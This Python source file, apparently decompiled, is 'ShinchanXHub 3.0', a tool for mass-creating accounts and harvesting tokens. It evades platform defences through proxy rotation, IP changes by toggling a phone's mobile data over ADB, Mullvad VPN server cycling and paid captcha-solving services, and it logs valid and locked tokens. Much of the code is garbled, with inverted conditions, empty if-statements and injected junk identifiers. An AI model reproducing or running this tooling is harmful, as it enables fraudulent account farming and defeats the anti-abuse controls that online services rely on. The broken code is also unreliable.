import sys
import warnings
warnings.filterwarnings('ignore')
try:
  if hasattr(sys.stdout,'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8',errors='replace')

  if hasattr(sys.stderr,'reconfigure'):
    sys.stderr.reconfigure(encoding='utf-8',errors='replace')

except Exception:
  pass

import asyncio
import math
import subprocess
from datetime import datetime, timezone
import hashlib
import os
import shutil
from pathlib import Path
import platform
import re
import threading
import time
import json
import random
import string
import signal
import socket
import tempfile
import zipfile
import io
from typing import Optional, Dict, Tuple, List, Any
import primp
from PIL import Image
import websockets
from python_socks.async_.asyncio import Proxy
import requests
import httpx
import tls_client
from colorama import Fore, init
from pystyle import Center
from rich.console import Console
import warnings
import truedriver as uc
from truedriver import cdp
import truedriver.cdp.input_ as cdp_input
import urllib3
import base64
import imaplib
import email as email_lib
from curl_cffi import requests as cffi_requests
pass
from typing import Optional
import sys
import os
import shutil
import threading
from datetime import datetime
from urllib.parse import urlparse
class Style:
  RESET = '\x1b[0m'
  BOLD = '\x1b[1m'
  DIM = '\x1b[2m'
  ITALIC = '\x1b[3m'
  UNDER = '\x1b[4m'
  INV = '\x1b[7m'
  RED = '\x1b[38;5;196m'
  RED_ORANGE = '\x1b[38;5;202m'
  ORANGE = '\x1b[38;5;208m'
  AMBER = '\x1b[38;5;214m'
  GOLD = '\x1b[38;5;220m'
  YELLOW = '\x1b[38;5;226m'
  LIGHT_YEL = '\x1b[38;5;229m'
  GREEN = '\x1b[38;5;82m'
  LIME = '\x1b[38;5;154m'
  CYAN = '\x1b[38;5;51m'
  SKY = '\x1b[38;5;45m'
  PURPLE = '\x1b[38;5;141m'
  MAGENTA = '\x1b[38;5;201m'
  HI = '\x1b[1;37m'
  WHITE = '\x1b[38;5;255m'
  SILVER = '\x1b[38;5;250m'
  MUTED = '\x1b[38;5;241m'
  DARK = '\x1b[38;5;236m'
  BORDER = '\x1b[38;5;238m'

class LeakXUI:
  BANNER_LINES = ['  _____ _     _      __  __ _    _       _     ',' / ____| |   (_)     \\ \\/ /| |  | |     | |    ','| (___ | |__  _ _ __  \\  / | |__| |_   _| |__  ',' \\___ \\| \'_ \\| | \'_ \\  / \\ |  __  | | | | \'_ \\ ',' ____) | | | | | | | |/ /\\ \\| |  | | |_| | |_) |','|_____/|_| |_|_|_| |_/_/  \\_\\_|  |_|\\__,_|_.__/']
  BANNER_GRADIENT = ('\x1b[38;5;196m','\x1b[38;5;202m','\x1b[38;5;208m','\x1b[38;5;214m','\x1b[38;5;220m','\x1b[38;5;226m')
  BRAILLE_FRAMES = ('⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏')
  _spinner_idx = 0
  @staticmethod
  def width() -> int:
    return shutil.get_terminal_size((80,24)).columns

  @staticmethod
  def gradient_text(text: str,start_rgb=(255,30,0),end_rgb=(255,225,0)) -> str:
    '''Interpolates text characters across a smooth RGB gradient.'''
    if text:
      return ''
    else:
      n = max(1,len(text)-1)
      chars = []
      for i,ch in enumerate(text):
        t = i/n
        r = int(start_rgb[0]+end_rgb[0]-start_rgb[0]*t)
        g = int(start_rgb[1]+end_rgb[1]-start_rgb[1]*t)
        b = int(start_rgb[2]+end_rgb[2]-start_rgb[2]*t)
        chars.append(f'''\x1b[38;2;{r};{g};{b}m{ch}''')

      return ''.join(chars)+Style.RESET

  @classmethod
  def render_banner(cls,shine_pos: Optional[int] = None) -> str:
    lines = []
    for y,line in enumerate(cls.BANNER_LINES):
      base_c = cls.BANNER_GRADIENT[min(y,len(cls.BANNER_GRADIENT)-1)]
      if shine_pos is None:
        lines.append(f'''  {base_c}{line}{Style.RESET}''')
        continue

      chars = []
      for x,ch in enumerate(line):
        if ch == ' ':
          chars.append(' ')
          continue

        diag = x+y*2
        dist = abs(diag-shine_pos)
        if dist <= 2:
          c = '\x1b[1;38;5;231m'
        else:
          if dist <= 5:
            c = '\x1b[1;38;5;226m'
          else:
            if dist <= 9:
              c = '\x1b[38;5;220m'
            else:
              c = c if dist <= 14 else '\x1b[38;5;214m'

        chars.append(f'''{c}{ch}''')

      lines.append(f'''  {''.join(chars)}{Style.RESET}''')

    return '\n'.join(lines)

  @classmethod
  def banner(cls,animate: bool = True):
    w = min(cls.width()-4,76)
    top_title = f''' ⚡ {Style.BOLD}{Style.WHITE}SHINCHANXHUB 3.0{Style.RESET} {Style.DARK}•{Style.RESET} {Style.CYAN}.gg/shinxhub{Style.RESET} {Style.DARK}+{Style.RESET} {Style.GOLD}.gg/leakx{Style.RESET} '''
    line_len = max(2,w-46)
    top_bar = f'''  {Style.RED}╭─[{Style.RESET}{top_title}{Style.RED}]{'─'*line_len}╮{Style.RESET}'''
    print(f'''\n{top_bar}''')
    if :
      import time
      try:
        sys.stdout.write('\x1b[?25l')
        for i in 22:
          if i > 0:
            sys.stdout.write(f'''\x1b[{len(cls.BANNER_LINES)}A\x0d''')

          sys.stdout.write(frame+'\n')
          sys.stdout.flush()
          time.sleep(0.01)

        sys.stdout.write(f'''\x1b[{len(cls.BANNER_LINES)}A\x0d''')
        sys.stdout.write(cls.render_banner(shine_pos=None)+'\n')
        sys.stdout.flush()
      except Exception:
        print(cls.render_banner(shine_pos=None))
      except:
        pass
      finally:
        sys.stdout.write('\x1b[?25h')
        sys.stdout.flush()

    print(cls.render_banner(shine_pos=None))
    bot_bar = cls.gradient_text('╰'+'─'*w-1+'╯',start_rgb=(255,220,0),end_rgb=(255,0,0))
    print(f'''  {bot_bar}''')

  @classmethod
  def shining_text(cls,text: str,duration: float = 0.35):
    '''Runs a brief glowing gold-to-white shining highlight beam across status text.'''
    if sys.stdout.isatty():
      print(f'''  {Style.BOLD}{Style.YELLOW}{text}{Style.RESET}''')
      return None
    else:
      import time
      span = len(text)+10
      steps = 18
      delay = max(0.008,duration/steps)
      sys.stdout.write('\x1b[?25l')
      try:
        for step in range(steps):
          pos = int(-4+step/steps-1*span)
          out = []
          for i,ch in enumerate(text):
            if ch == ' ':
              out.append(' ')
              continue

            d = abs(i-pos)
            if d <= 1:
              c = '\x1b[1;38;5;231m'
            else:
              if d <= 3:
                c = '\x1b[1;38;5;226m'
              else:
                if d <= 6:
                  c = '\x1b[38;5;220m'
                else:
                  c = c if d <= 10 else '\x1b[38;5;214m'

            out.append(f'''{c}{ch}''')

          sys.stdout.write(f'''\x0d  {''.join(out)}{Style.RESET}''')
          sys.stdout.flush()
          time.sleep(delay)

        sys.stdout.write(f'''\x0d  {Style.BOLD}{Style.YELLOW}{text}{Style.RESET}\n''')
        sys.stdout.flush()
      finally:
        sys.stdout.write('\x1b[?25h')
        sys.stdout.flush()

      return None

  @classmethod
  def divider(cls):
    w = min(cls.width()-4,76)
    line = cls.gradient_text('─'*w,start_rgb=(255,40,0),end_rgb=(255,215,0))
    print(f'''  {line}''')

  @classmethod
  def config(cls,items: list):
    '''Compact 2-column aesthetic configuration card.'''
    w = min(cls.width()-4,76)
    col_w = max(24,w-7//2)
    print(f'''\n  {Style.ORANGE}╭─[ {Style.BOLD}{Style.YELLOW}⚙️ SYSTEM CONFIGURATION{Style.RESET}{Style.ORANGE} ]{'─'*max(2,w-27)}╮{Style.RESET}''')
    for i in range(0,len(items),2):
      k1,v1 = items[i]
      col1 = f'''{Style.AMBER}▸{Style.RESET} {Style.SILVER}{str(k1).capitalize():<8}:{Style.RESET} {Style.BOLD}{Style.WHITE}{v1}{Style.RESET}'''
      clean1 = re.sub('\\033\\[[0-9;]*m','',col1)
      pad1 = max(0,col_w-len(clean1))
      if i+1 < len(items):
        k2,v2 = items[i+1]
        col2 = f'''{Style.AMBER}▸{Style.RESET} {Style.SILVER}{str(k2).capitalize():<8}:{Style.RESET} {Style.BOLD}{Style.WHITE}{v2}{Style.RESET}'''
        clean2 = re.sub('\\033\\[[0-9;]*m','',col2)
        pad2 = max(0,col_w-len(clean2))
        print(f'''  {Style.ORANGE}│{Style.RESET}  {col1}{' '*pad1} {Style.DARK}│{Style.RESET} {col2}{' '*pad2}  {Style.ORANGE}│{Style.RESET}''')
        continue

      pad_all = max(0,w-6-len(clean1))
      print(f'''  {Style.ORANGE}│{Style.RESET}  {col1}{' '*pad_all}  {Style.ORANGE}│{Style.RESET}''')

    print(f'''  {Style.ORANGE}╰{'─'*w-1}╯{Style.RESET}\n''')

  @classmethod
  def captcha_card(cls,cap_balance: Optional[float] = None):
    '''Compact aesthetic captcha selection card.'''
    w = min(cls.width()-4,76)
    bal_str = f''' {Style.DARK}[{Style.GREEN}${cap_balance:.2f} USD{Style.DARK}]{Style.RESET}''' if cap_balance is not None else ''
    print(f'''  {Style.AMBER}╭─[ {Style.BOLD}{Style.YELLOW}🧩 CAPTCHA SOLVER SELECTION{Style.RESET}{Style.AMBER} ]{'─'*max(2,w-31)}╮{Style.RESET}''')
    line1 = f'''  {Style.AMBER}│{Style.RESET}  {Style.BOLD}{Style.HI}[1]{Style.RESET} {Style.WHITE}NopeCHA{Style.RESET}       {Style.DARK}•{Style.RESET} {Style.MUTED}Extension Key Pool (Rotation){Style.RESET}'''
    clean1 = re.sub('\\033\\[[0-9;]*m','',line1)
    print(f'''{line1}{' '*max(2,w-len(clean1)+2)}{Style.AMBER}│{Style.RESET}''')
    line2 = f'''  {Style.AMBER}│{Style.RESET}  {Style.BOLD}{Style.HI}[2]{Style.RESET} {Style.WHITE}CapSolver.com{Style.RESET} {Style.DARK}•{Style.RESET} {Style.MUTED}AI Cloud Solver{Style.RESET}{bal_str}'''
    clean2 = re.sub('\\033\\[[0-9;]*m','',line2)
    print(f'''{line2}{' '*max(2,w-len(clean2)+2)}{Style.AMBER}│{Style.RESET}''')
    print(f'''  {Style.AMBER}╰{'─'*w-1}╯{Style.RESET}''')

  @classmethod
  def prompt(cls,message: str,default: str = '') -> str:
    def_hint = f''' {Style.MUTED}[{Style.YELLOW}{default}{Style.MUTED}]{Style.RESET}''' if default else ''
    sys.stdout.write(f'''  {Style.BOLD}{Style.RED}❯{Style.ORANGE}❯{Style.YELLOW}❯{Style.RESET} {Style.WHITE}{message}{Style.RESET}{def_hint}: {Style.BOLD}{Style.HI}''')
    sys.stdout.flush()
    try:
      res = input().strip()
    finally:
      (KeyboardInterrupt,EOFError)
      print(Style.RESET)
      raise

    sys.stdout.write(Style.RESET)
    return (res or default)

  @classmethod
  def set_title(cls,text: str):
    title = f'''ShinchanXHub · {text}'''
    if sys.platform == 'win32':
      import ctypes
      try:
        ctypes.windll.kernel32.SetConsoleTitleW(title)
        return None
      except Exception:
        return None

    sys.stdout.write(f'''\x1b]0;{title}\x07''')
    sys.stdout.flush()

  @classmethod
  def status_line(cls,current: int,target: int,valid: int,speed: float = 0,workers: int = 1):
    glyph = cls.BRAILLE_FRAMES[cls._spinner_idx%len(cls.BRAILLE_FRAMES)]
    cls._spinner_idx += 1
    if target > 0:
      pct = min(1,current/target)
      bar_len = 12
      filled = int(bar_len*pct)
      bar_chars = [f'''{Style.ORANGE}█''' for b in range(filled)]
      bar = ''.join(bar_chars)+f'''{Style.DARK}{'░'*bar_len-filled}{Style.RESET}'''
      target_str = f'''{Style.BOLD}{Style.WHITE}{current}{Style.MUTED}/{Style.HI}{target}{Style.RESET} ({int(pct*100)}%)'''
    else:
      bar = f'''{Style.AMBER}∞{Style.RESET}'''
      target_str = f'''{Style.BOLD}{Style.WHITE}{current}{Style.RESET} created'''

    ts = datetime.now().strftime('%H:%M:%S')
    speed_str = f''' {Style.DARK}│{Style.RESET} {Style.CYAN}⚡ {speed:.1f}/m{Style.RESET}''' if speed > 0 else ''
    line = ''.join(['\x0d  ',f'''{Style.DARK}''',f'''{ts}''',f'''{Style.RESET}''',' ',f'''{Style.BOLD}''',f'''{Style.YELLOW}''',f'''{glyph}''',f'''{Style.RESET}''',' [',f'''{bar}''','] ',f'''{target_str}''',' ',f'''{Style.DARK}''','│',f'''{Style.RESET}''',' ',f'''{Style.BOLD}''',f'''{Style.GREEN}''','✔ ',f'''{valid}''',' valid',f'''{Style.RESET}''',f'''{speed_str}''',' ',f'''{Style.DARK}''','│',f'''{Style.RESET}''',' ',f'''{Style.MUTED}''','w#',f'''{Style.AMBER}''',f'''{workers}''',f'''{Style.RESET}''','  '])
    sys.stdout.write(line)
    sys.stdout.flush()

  @classmethod
  def summary(cls,valid: int,locked: int,invalid: int,unverified: int,elapsed_str: str = ''):
    total = valid+locked+invalid+unverified
    rate = f'''{valid/total*100:.1f}%''' if total > 0 else '0.0%'
    w = min(cls.width()-4,76)
    print()
    print(f'''  {Style.GREEN}╭─[ {Style.BOLD}{Style.HI}★ SESSION RESULTS SUMMARY{Style.RESET}{Style.GREEN} ]{'─'*max(2,w-30)}╮{Style.RESET}''')
    if elapsed_str:
      print(f'''  {Style.GREEN}│{Style.RESET}  {Style.MUTED}⏱ Duration    :{Style.RESET} {Style.BOLD}{Style.WHITE}{elapsed_str}{Style.RESET}''')

    print(f'''  {Style.GREEN}│{Style.RESET}  {Style.MUTED}📊 Total Cycles:{Style.RESET} {Style.BOLD}{Style.WHITE}{total}{Style.RESET}  {Style.DARK}│{Style.RESET}  {Style.MUTED}✔ Valid:{Style.RESET} {Style.BOLD}{Style.GREEN}{valid} ({rate}){Style.RESET}''')
    print(''.join(['  ',f'''{Style.GREEN}''','│',f'''{Style.RESET}''','  ',f'''{Style.MUTED}''','🔒 Locked      :',f'''{Style.RESET}''',' ',f'''{Style.AMBER}''',f'''{locked}''',f'''{Style.RESET}''','  ',f'''{Style.DARK}''','│',f'''{Style.RESET}''','  ',f'''{Style.MUTED}''','✖ Invalid:',f'''{Style.RESET}''',' ',f'''{Style.RED}''',f'''{invalid}''',f'''{Style.RESET}''','  ',f'''{Style.DARK}''','│',f'''{Style.RESET}''','  ',f'''{Style.MUTED}''','⚠ Unverified:',f'''{Style.RESET}''',' ',f'''{Style.SILVER}''',f'''{unverified}''',f'''{Style.RESET}''']))
    print(f'''  {Style.GREEN}│{Style.RESET}  {Style.MUTED}📁 Output File :{Style.RESET} {Style.CYAN}output/valid.txt{Style.RESET}''')
    print(f'''  {Style.GREEN}╰{'─'*w-1}╯{Style.RESET}\n''')
    cfg = globals().get('config',{})
    if cfg.get('notifications',{}).get('on_finish',True):
      if valid > 0:
        pass

      'Generation Session Finished'.send_discord_webhook(title=f'''Session completed in `{(elapsed_str or 'N/A')}`.''',description=[{'name':'Valid Tokens','value':f'''**{valid}** ({rate})''','inline':True},{'name':'Total Cycles','value':str(total),'inline':True},{'name':'Locked','value':str(locked),'inline':True},{'name':'Invalid','value':str(invalid),'inline':True}],fields=65382,color=16755200)
      return None
    else:
      return None

class LeakXLogger:
  __doc__ = 'Cyberpunk high-visibility streaming logger with aesthetic micro badges.'
  BADGE_STYLES = {'MAIL':(Style.PURPLE,'✉ MAIL'),'PROX':(Style.CYAN,'🌐 PROX'),'PAGE':(Style.SKY,'⚡ PAGE'),'FORM':(Style.GOLD,'📝 FORM'),'CAPT':(Style.AMBER,'🧩 CAPT'),'TOKN':(Style.YELLOW,'🔑 TOKN'),'STAT':(Style.LIME,'📊 STAT'),'INFO':(Style.WHITE,'ℹ INFO'),' OK ':(Style.GREEN,'✔ PASS'),'WARN':(Style.ORANGE,'▲ WARN'),'FAIL':(Style.RED,'✖ FAIL'),'DBUG':(Style.MUTED,'⚙ DBUG'),'ADB ':(Style.SKY,'📱 ADB ')}
  def __init__(self):
    self._lock = threading.Lock()
    self._captcha_start = {}

  def mask_email(self,email: str) -> str:
    cfg = globals().get('config',{})
    if cfg.get('ui',{}).get('mask_sensitive',True) or '@' not in email:
      return email
    else:
      username,domain = email.split('@',1)
      masked = username[:3] if len(username) > 3 else username[0]+'****'
      return f'''{masked}@{domain}'''

  def mask_proxy(self,proxy_url: str) -> str:
    if proxy_url:
      return proxy_url
    else:
      try:
        parsed = urlparse(proxy_url)
        if parsed.username and parsed.password:
          return f'''{parsed.scheme}://{parsed.username}:***@{parsed.hostname}:{parsed.port}'''
        else:
          return proxy_url

      except Exception:
        pass

  def mask_token(self,token: str) -> str:
    cfg = globals().get('config',{})
    if cfg.get('ui',{}).get('mask_sensitive',True):
      return token
    else:
      if len(token) > 18:
        pass

      return token

  def _write(self,tag: str,msg: str,worker: int = 0,inv: bool = False):
    ts = datetime.now().strftime('%H:%M:%S')
    w_prefix = f'''{Style.ORANGE}w#{worker}{Style.DARK}│{Style.RESET} ''' if worker > 0 else ''
    color,label = self.BADGE_STYLES.get(tag,(Style.WHITE,f''' {tag.strip()} '''))
    if tag == ' OK ':
      badge = f'''\x1b[1;97;48;5;28m {label} \x1b[0m'''
    else:
      if tag == 'FAIL':
        badge = f'''\x1b[1;97;48;5;160m {label} \x1b[0m'''
      else:
        badge = f'''{Style.DARK}[{color}{Style.BOLD}{label}{Style.RESET}{Style.DARK}]{badge if inv else \x1b[1;30;48;5;220m {label} \x1b[0m}'''

    clear = '\x0d                                                                                               \x0d'
    line = f'''{clear}  {Style.DARK}{ts}{Style.RESET} {badge} {w_prefix}{Style.WHITE}{msg}{Style.RESET}\n'''
    with self._lock:
      try:
        sys.stdout.write(line)
        sys.stdout.flush()
      except UnicodeEncodeError:
        sys.stdout.write(line.encode('ascii','replace').decode('ascii'))
        sys.stdout.flush()
      except:
        pass

  def email_got(self,email: str,worker: int = 0):
    self._write('MAIL',f'''acquired: {self.mask_email(email)}''',worker)

  def proxy_got(self,proxy_url: str,worker: int = 0):
    self._write('PROX',f'''tunnel: {self.mask_proxy(proxy_url)}''',worker)

  def register_page(self,worker: int = 0):
    self._write('PAGE','register endpoint mounted',worker)

  def filled_info(self,worker: int = 0):
    self._write('FORM','form payload injected',worker)

  def solving_captcha(self,worker: int = 0):
    import time
    self._captcha_start[worker] = time.time()
    self._write('CAPT','solving challenge...',worker)

  def captcha_solved(self,answer: str = '',worker: int = 0):
    import time
    t0 = self._captcha_start.get(worker,time.time())
    elapsed = round(time.time()-t0,2)
    self._write('CAPT',f'''solved in {elapsed}s''',worker)

  def verified_mail(self,worker: int = 0):
    self._write('MAIL','token verified',worker)

  def token_got(self,token: str,worker: int = 0):
    self._write('TOKN',f'''captured: {self.mask_token(token)}''',worker)

  def token_status(self,status: str,worker: int = 0):
    inv = status in ('VALID','OK')
    self._write('STAT',f'''state: {status}''',worker,inv=inv)

  def info(self,message: str,worker: int = 0):
    self._write('INFO',message,worker)

  def success(self,message: str,worker: int = 0):
    self._write(' OK ',message,worker,inv=True)

  def warning(self,message: str,worker: int = 0):
    self._write('WARN',message,worker)

  def error(self,message: str,worker: int = 0):
    self._write('FAIL',message,worker,inv=True)

  def debug(self,message: str,worker: int = 0):
    if os.environ.get('LEAKX_DEBUG'):
      self._write('DBUG',message,worker)
      return None
    else:
      return None

  def adb(self,message: str,worker: int = 0):
    self._write('ADB ',message,worker)

  def mullvad(self,message: str,worker: int = 0):
    self._write('MULL',message,worker)

def play_alert_sound():
  '''Plays an audio chime on valid token hit.'''
  try:
    cfg = globals().get('config',{})
    if cfg.get('ui',{}).get('sound',True):
      return None
    else:
      if sys.platform == 'win32':
        import winsound
        threading.Thread(target=lambda : winsound.Beep(1200,160),daemon=True).start()
        return None
      else:
        sys.stdout.write('\x07')
        sys.stdout.flush()
        return None

  except Exception:
    return None

def send_discord_webhook(title: str,description: str,fields: Optional[List[Dict[(str,Any)]]] = None,color: int = 16733440):
  '''Dispatches a Discord webhook notification embed.'''
  cfg = globals().get('config',{})
  webhook_url = (cfg.get('notifications',{}).get('discord_webhook') or cfg.get('discord_webhook') or '').strip()
  if webhook_url or webhook_url.startswith('http'):
    return None
  else:
    def _send():
      try:
        if :
          pass

        payload = {'username':'https://i.imgur.com/4M34hi2.png','avatar_url':f'''⚡ ShinchanXHub • {title}''','embeds':[{'title':description,'description':color,'color':fields,'fields':[],'footer':{'text':'ShinchanXHub • .gg/shinxhub + .gg/leakx'},'timestamp':datetime.now(timezone.utc).isoformat()}]}
        requests.post(webhook_url,json=payload,timeout=6)
        return None
      except Exception:
        return None

    threading.Thread(target=_send,daemon=True).start()
    return None

import os
import random
from pathlib import Path
from typing import Optional, Dict, List
from urllib.parse import urlparse
def parse_proxy(proxy_string: str) -> Optional[Dict]:
  if proxy_string:
    return None
  else:
    proxy_string = proxy_string.strip()
    if '://' not in proxy_string:
      proxy_string = 'socks5://'+proxy_string

    try:
      parsed = urlparse(proxy_string)
      proxy_type = parsed.scheme.lower()
      host = parsed.hostname
      port = parsed.port
      if host or port:
        return None
      else:
        full_url = proxy_string
        masked_url = proxy_string
        if parsed.username and parsed.password:
          masked_url = f'''{proxy_type}://{parsed.username}:***@{host}:{port}'''

        return {'type':proxy_type,'host':host,'port':port,'full_url':full_url,'masked_url':masked_url}

    except Exception:
      return None

def get_browser_proxy_args(proxy_config: Dict) -> List[str]:
  args = []
  if proxy_config:
    return args
  else:
    full_url = proxy_config.get('full_url')
    if full_url:
      args.append(f'''--proxy-server={full_url}''')
      args.append('--proxy-bypass-list=<-loopback>')

    return args

def get_session_proxy(proxy_config: Dict) -> Optional[Dict]:
  if proxy_config:
    return None
  else:
    full_url = proxy_config.get('full_url')
    if full_url:
      return {'http':full_url,'https':full_url}
    else:
      return None

def load_proxies(proxy_file: str = 'input/proxies.txt',enabled: bool = True) -> List[Dict]:
  if enabled:
    return []
  else:
    proxy_path = Path(proxy_file)
    if proxy_path.exists():
      print(f'''[WARNING] Proxy file not found: {proxy_file}''')
      return []
    else:
      try:
        proxies = []
        with open(proxy_path,'r',encoding='utf-8') as f:
          for line in f:
            line = line.strip()
            if line and line.startswith('#'):
              parsed = parse_proxy(line)
              if parsed:
                proxies.append(parsed)

          try:
            __CHAOS_PY_PASS_ERR__
          except:
            pass

      except Exception as e:
        print(f'''[ERROR] Error loading proxies: {e}''')
        return []

      return proxies

def rotate_proxy(proxy_list: List[Dict],current_index: int = None) -> tuple:
  if proxy_list:
    return (None,0)
  else:
    if current_index is None:
      current_index = random.randint(0,len(proxy_list)-1)
    else:
      current_index = current_index+1%len(proxy_list)

    return (proxy_list[current_index],current_index)

def get_random_proxy(proxy_list: List[Dict]) -> Optional[Dict]:
  if proxy_list:
    return None
  else:
    return random.choice(proxy_list)

import threading
_file_lock = threading.Lock()
def remove_proxy(proxy_list: List[Dict],proxy_config: Dict,proxy_file: str = 'input/proxies.txt'):
  if proxy_config:
    return None
  else:
    full_url = proxy_config.get('full_url','')
    try:
      proxy_list[:] = [p for p in proxy_list if p.get('full_url') != full_url]
    except Exception:
      pass

    proxy_path = Path(proxy_file)
    if proxy_path.exists():
      return None
    else:
      with _file_lock:
        try:
          with open(proxy_path,'r',encoding='utf-8') as f:
            lines = f.readlines()

        except Exception as e:
          print(f'''[WARNING] Failed to remove proxy from file: {e}''')

        new_lines = []
        for line in lines:
          stripped = line.strip()
          if (stripped and stripped.startswith('#')):
            new_lines.append(line)
            continue

          parsed = parse_proxy(stripped)
          if parsed and parsed.get('full_url') == full_url:
            continue

          new_lines.append(line)

        with open(proxy_path,'w',encoding='utf-8') as f:
          f.writelines(new_lines)

        __CHAOS_PY_NO_FUNC_ERR__(f'''__CHAOS_PY_NULL_PTR_VALUE_ERR__print[PROXY] Removed used proxy from {proxy_file} ({' removed, '.{len(lines)-len(new_lines)}(sum())} remaining)''')

      return None
      return None

def test_proxy(proxy_config: Dict,test_url: str = 'https://api.ipify.org',timeout: int = 10) -> Optional[str]:
  if proxy_config:
    return None
  else:
    try:
      import requests
      proxies = get_session_proxy(proxy_config)
      response = requests.get(test_url,proxies=proxies,timeout=timeout)
      if response.status_code == 200:
        return response.text.strip()
      else:
        return None

    except Exception:
      pass

import subprocess as _sp
import time
import requests
import shutil
from pathlib import Path
from typing import Optional
def _resolve_adb() -> str:
  local = Path(__file__).parent/'platform-tools'/'adb.exe'
  if local.exists():
    return str(local)
  else:
    found = shutil.which('adb')
    if found:
      return found
    else:
      return 'adb'

_ADB_EXE = _resolve_adb()
class _NullLogger:
  def info(self,msg):
    print(f'''[INFO] {msg}''')

  def success(self,msg):
    print(f'''[OK]   {msg}''')

  def warning(self,msg):
    print(f'''[WARN] {msg}''')

  def error(self,msg):
    print(f'''[ERR]  {msg}''')

  def adb(self,msg):
    print(f'''[ADB]  {msg}''')

  def debug(self,msg):
    return None

class ADBRotator:
  def __init__(self,logger=None,device_id: str = None):
    self.enabled = False
    self._fail_count = 0
    self._MAX_FAILS = 5
    self._serial = __CHAOS_PY_NULL_PTR_VALUE_ERR__ if device_id.strip() else __CHAOS_PY_NULL_PTR_VALUE_ERR__ if device_id else device_id.strip()
    self._airplane_fallback = False
    self.log = (logger or _NullLogger())

  def _adb(self):
    cmd = [_ADB_EXE]
    if self._serial:
      cmd.extend(['-s',self._serial])

    cmd.extend(args)
    try:
      r = _sp.run(cmd,capture_output=True,text=True,timeout=timeout)
      return (r.returncode == 0,r.stdout.strip())
    except Exception:
      return (False,'')

  def is_device_connected(self) -> bool:
    try:
      r = _sp.run([_ADB_EXE,'devices'],capture_output=True,text=True,timeout=5)
      for line in r.stdout.strip().splitlines()[1:]:
        if 'device' in line and 'offline' not in line:
          if self._serial:
            self._serial = line.split()[0]

          return True
        else:
          continue

    except Exception:
      pass

    return False

  def _get_external_ip(self) -> Optional[str]:
    for url in ('https://api.ipify.org','https://ifconfig.me/ip'):
      try:
        r = requests.get(url,timeout=6)
        if r.status_code == 200 and r.text.strip():
          r.text.strip()
          return
        else:
          continue

      except Exception:
        pass

  def _wait_for_interface(self,timeout: int = 15) -> bool:
    deadline = time.time()+timeout
    while time.time() < deadline:
      ok,out = self._adb('shell','ip','route','get','8.8.8.8')
      if ok and 'src' in out:
        return True
      else:
        time.sleep(1)
        return False

  def _data_off(self) -> bool:
    if self._airplane_fallback:
      ok,_ = self._adb('shell','cmd','connectivity','airplane-mode','enable')
      return ok
    else:
      ok,_ = self._adb('shell','svc','data','disable')
      if ok:
        self._airplane_fallback = True
        return self._data_off()
      else:
        return ok

  def _data_on(self) -> bool:
    if self._airplane_fallback:
      ok,_ = self._adb('shell','cmd','connectivity','airplane-mode','disable')
      return ok
    else:
      ok,_ = self._adb('shell','svc','data','enable')
      if ok:
        self._airplane_fallback = True
        return self._data_on()
      else:
        return ok

  def initialize(self) -> bool:
    try:
      result = _sp.run([_ADB_EXE,'devices'],capture_output=True,text=True,timeout=5)
      lines = result.stdout.strip().splitlines()
      devs = [__CHAOS_PY_NULL_PTR_VALUE_ERR__ for line in lines[1:]]
      if devs:
        detected = devs[0].split()[0]
        if self._serial and any((self._serial in line for line in devs)):
          self.log.adb(f'''Using config device_id: {self._serial}''')
        else:
          self._serial = detected

        self.enabled = True
        self.log.adb(f'''ADB rotation ENABLED — device: {self._serial}''')
        return True
      else:
        if self._serial:
          ok,out = self._adb('shell','echo','ping')
          if __CHAOS_PY_NULL_PTR_VALUE_ERR__ in 'ping':
            self.log.adb(f'''ADB rotation ENABLED (config serial) — device: {self._serial}''')
            return True

        else:
          self.enabled = False
          self.log.warning('ADB: no device detected — check USB cable, enable USB debugging, and run: adb devices')
          return False

    except Exception as e:
      self.log.warning(f'''ADB init error: {e}''')

  def rotate(self) -> bool:
    if self.enabled:
      return False
    else:
      if self.is_device_connected():
        self.log.warning('[ADB] Device not connected — cannot rotate')
        return False
      else:
        old_ip = (self._get_external_ip() or 'unknown')
        self.log.adb(f'''Rotating IP (current: {old_ip})''')
        self._data_off()
        time.sleep(4)
        self._data_on()
        time.sleep(2)
        self._wait_for_interface(timeout=20)
        for _ in range(20):
          time.sleep(2)
          new_ip = self._get_external_ip()
          if new_ip and new_ip != old_ip:
            self.log.adb(f'''New IP: {new_ip}''')
            self._fail_count = 0
            return True
          else:
            continue
            self._fail_count += 1
            self.log.warning(f'''[ADB] IP unchanged (attempt {self._fail_count}/{self._MAX_FAILS})''')
            if self._fail_count >= self._MAX_FAILS:
              self.enabled = False
              self.log.error('[ADB] Sticky IP — ADB rotation DISABLED')

            return False

  def auto_switch_ip(self) -> bool:
    if self.enabled:
      return True
    else:
      self.log.adb('Triggering ADB IP rotation...')
      return self.rotate()

import json
import random
import re
import shutil
import subprocess
import sys
import threading
import time
from pathlib import Path
from typing import Dict, List, Optional, Tuple
import requests
def _resolve_mullvad() -> str:
  '''Find the mullvad CLI binary across macOS, Windows, and Linux.'''
  found = (shutil.which('mullvad') or shutil.which('mullvad.exe'))
  if found:
    return found
  else:
    mac_paths = [Path('/usr/local/bin/mullvad'),Path('/opt/homebrew/bin/mullvad'),Path('/Applications/Mullvad VPN.app/Contents/Resources/mullvad')]
    for p in mac_paths:
      if p.exists() and p.is_file():
        str(p)
        return
      else:
        continue
        win_paths = [Path('C:/Program Files/Mullvad VPN/resources/mullvad.exe'),Path('C:/Program Files (x86)/Mullvad VPN/resources/mullvad.exe'),Path(Path.home()/'AppData/Local/Programs/Mullvad VPN/resources/mullvad.exe')]
        for p in win_paths:
          if p.exists() and p.is_file():
            str(p)
            return
          else:
            continue
            linux_paths = [Path('/usr/bin/mullvad'),Path('/usr/local/bin/mullvad')]
            for p in linux_paths:
              if p.exists() and p.is_file():
                str(p)
                return
              else:
                continue
                return 'mullvad'

_MULLVAD_EXE = _resolve_mullvad()
class MullvadRotator:
  __doc__ = '''
    Manages Mullvad VPN IP rotation with country switching, auto-login recovery,
    real-time device protection, and automatic remove-waves for new/rogue devices.
    '''
  def __init__(self,logger=None,config: Optional[Dict] = None):
    self.log = (logger or _NullLogger())
    if :
      pass

    self.config = {}
    self.enabled = self.config.get('enabled',False)
    self.account = str(self.config.get('account','')).strip()
    self.settle_seconds = self.config.get('settle_seconds',0)
    self.verify_ip = self.config.get('verify_ip',True)
    self.max_wait = self.config.get('max_wait',20)
    self._binary = _resolve_mullvad()
    self._available_countries = {}
    self._country_pool = []
    self._last_country_code = None
    self._last_country_name = None
    self._last_ip = None
    self._fail_count = 0
